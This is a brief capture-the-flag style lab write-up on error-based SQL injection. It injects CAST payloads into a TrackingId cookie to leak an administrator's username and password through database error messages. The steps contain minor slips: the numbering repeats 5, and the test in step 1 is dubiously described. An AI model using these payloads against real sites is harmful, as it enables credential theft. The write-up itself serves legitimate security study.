* Title:  Visible Error-Based SQL Injection

* Goal: Log in as the administrator user.

* Payload Used: 

``` ' AND CAST((SELECT 1) AS int)-- ```, 

``` ' AND 1=CAST((SELECT 1) AS int)-- ```,

``` ' AND 1=CAST((SELECT username FROM users) AS int)-- ```, 

``` ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- ```, 

``` ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ```


* Steps:

1. Check if SQL injection works Add a ' to the TrackingId cookie and see how the app responds. If it gives a normal response, we’re in.

2. Test with a basic payload Try: ``` ' AND CAST((SELECT 1) AS int)-- ``` 
It throws an error. That’s good. Now try: ``` ' AND 1=CAST((SELECT 1) AS int)-- ```. 
This works because 1=1 is true. We get a 200 status code.

3. Try pulling data from users table Assuming users and username exist, try: ``` ' AND 1=CAST((SELECT username FROM users) AS int)-- ```.  
But this breaks. The app cuts off the -- because the cookie value was too long. So just remove the original TrackingId value and inject directly:
``` TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- ```

5. Fix the multiple rows error. Now the error says it’s getting multiple rows. Fix it with LIMIT 1:``` ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- ```
Now the error message shows the first username: administrator.

5. Extract the password Replace username with password:``` ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ``` 
Boom. The error message leaks the password like a fool.

* Takeaway: This lab shows how visible error messages can be weaponized to extract sensitive data. By forcing type conversion errors, we can leak usernames and passwords directly into the response. 
